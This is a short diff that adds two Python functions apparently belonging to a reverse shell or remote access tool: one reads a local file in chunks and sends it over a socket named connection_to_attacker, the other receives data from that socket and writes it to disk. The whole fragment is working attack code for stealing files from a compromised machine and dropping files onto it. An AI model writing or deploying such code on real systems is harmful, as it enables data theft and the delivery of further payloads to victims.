@@ -1,0 +1,20 @@
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    packet = f.read(1024)
+    while len(packet) > 0:
+        connection_to_attacker.send(packet)
+        packet = f.read(1024)
+    connection_to_attacker.send('DONE'.encode())
+
+
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    while True:
+        chunk = connection_to_attacker.recv(1024)
+        if chunk.endswith('DONE'.encode()):
+            f.write(chunk[:-4])
+            f.close()
+            break
+        f.write(chunk)
+
